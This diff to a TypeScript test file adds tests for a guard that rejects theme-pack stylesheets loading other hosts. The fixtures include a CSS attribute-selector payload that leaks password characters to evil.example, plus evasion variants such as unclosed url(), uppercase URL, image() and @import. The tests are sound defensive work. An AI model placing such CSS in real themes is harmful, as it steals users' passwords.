@@ -9,6 +9,7 @@ import { describe, expect, it } from 'vitest';
 import { ThemeIndex, ThemeSettings, checkThemeCss, type ThemeManifest } from '@arclight/shared';
 import { createTestDb } from '../../db/test-utils.js';
 import { setSection } from '../settings/service.js';
+import { externalReferenceProblems } from './css-guard.js';
 import { themesRoutes } from './routes.js';
 import { ThemesService, type FetchLike } from './service.js';
 
@@ -227,5 +228,64 @@ describe('pack images', () => {
     const service = t.make();
     expect((await service.sync()).changed).toEqual(['frost']);
     expect(service.filePath('frost', 'images/bg.webp')).toBe(join(t.syncedDir, 'frost', 'images', 'bg.webp'));
+  });
+});
+
+describe('remote pack stylesheets (exfiltration guard)', () => {
+  // A catalogue that turned hostile: an attribute selector per guessed character, each loading a
+  // URL on another host that records the guess.
+  const exfil = (id: string, tail = ')') =>
+    `[data-theme="${id}"] { --al-void: #fff; }\n[data-theme="${id}"] input[name="password"][value^="a"] { background: url(https://evil.example/?v=a${tail} }\n`;
+  const assets = new Set(['fonts/x.woff2', 'images/bg.webp']);
+
+  it('accepts only complete url()s to the pack\'s own files', () => {
+    expect(externalReferenceProblems(css('sorbet'), assets)).toEqual([]);
+    expect(externalReferenceProblems('[data-theme="s"] { background: url( "images/bg.webp" ) }', assets)).toEqual([]);
+    expect(externalReferenceProblems(exfil('s'), assets)[0]).toMatch(/evil\.example/);
+    for (const bad of ['//evil.example/x.png', 'data:image/svg+xml,<svg/>', '/api/v1/system/status', 'https://evil.example/fonts/x.woff2', '../other/fonts/x.woff2']) {
+      expect(externalReferenceProblems(`[data-theme="s"] { background: url("${bad}") }`, assets), bad).not.toEqual([]);
+    }
+  });
+
+  it('refuses what a regex over whole url() tokens misses', () => {
+    // Unterminated at the end of the file: still a URL to the browser, invisible to checkThemeCss.
+    expect(checkThemeCss(exfil('s', ''), 's', assets)).toEqual([]);
+    expect(externalReferenceProblems(exfil('s', ''), assets)).toContain('a url() is not closed');
+    expect(externalReferenceProblems('[data-theme="s"] { background: URL(https://evil.example/x) }', assets)[0]).toMatch(/evil/);
+    expect(externalReferenceProblems('[data-theme="s"] { background: url(images/bg.webp x) }', assets)).toContain('a url() is not closed');
+    expect(externalReferenceProblems('[data-theme="s"] { background: image("https://evil.example/x") }', assets)[0]).toMatch(/image\(\)/);
+    expect(externalReferenceProblems('[data-theme="s"] { background: -webkit-cross-fade(url(images/bg.webp), url(images/bg.webp), 50%) }', assets)[0]).toMatch(/cross-fade/);
+    expect(externalReferenceProblems('@IMPORT "https://evil.example/x.css";', assets)[0]).toMatch(/@import/);
+    expect(externalReferenceProblems('[data-theme="s"] { color: red } /* never closed', assets)).toContain('unterminated comment');
+  });
+
+  it('does not install or serve a synced pack that loads another host', async () => {
+    const src = source({ evil: packFiles('evil', '1.0.0', exfil('evil')), sneaky: packFiles('sneaky', '1.0.0', exfil('sneaky', '')), sorbet: packFiles('sorbet', '1.0.0') });
+    const t = await setup(src.fetch);
+    const service = t.make();
+    const r = await service.sync();
+    expect(r.changed).toEqual(['sorbet']);
+    expect(r.skipped.map((s) => s.id).sort()).toEqual(['evil', 'sneaky']);
+    expect(r.skipped.find((s) => s.id === 'sneaky')?.reason).toMatch(/not closed/);
+    expect(existsSync(join(t.syncedDir, 'evil'))).toBe(false);
+    expect(existsSync(join(t.syncedDir, 'sneaky'))).toBe(false);
+    expect(service.themes().map((x) => x.id)).toEqual(['tron', 'sorbet']);
+
+    const app = Fastify().withTypeProvider<ZodTypeProvider>();
+    app.setValidatorCompiler(validatorCompiler);
+    app.setSerializerCompiler(serializerCompiler);
+    await app.register(themesRoutes(service));
+    expect((await app.inject({ url: '/theme/evil/theme.css' })).statusCode).toBe(404);
+    expect((await app.inject({ url: '/theme/sneaky/theme.css' })).statusCode).toBe(404);
+    const good = await app.inject({ url: '/theme/sorbet/theme.css?v=1.0.0' });
+    expect(good.headers['content-type']).toBe('text/css; charset=utf-8');
+    expect(good.headers['x-content-type-options']).toBe('nosniff');
+    await app.close();
+  });
+
+  it('skips a hostile pack dropped into a pack folder on disk too', async () => {
+    const t = await setup();
+    writePack(t.bundledDir, 'sneaky', '1.0.0', exfil('sneaky', ''));
+    expect(t.make().themes().map((x) => x.id)).toEqual(['tron']);
   });
 });
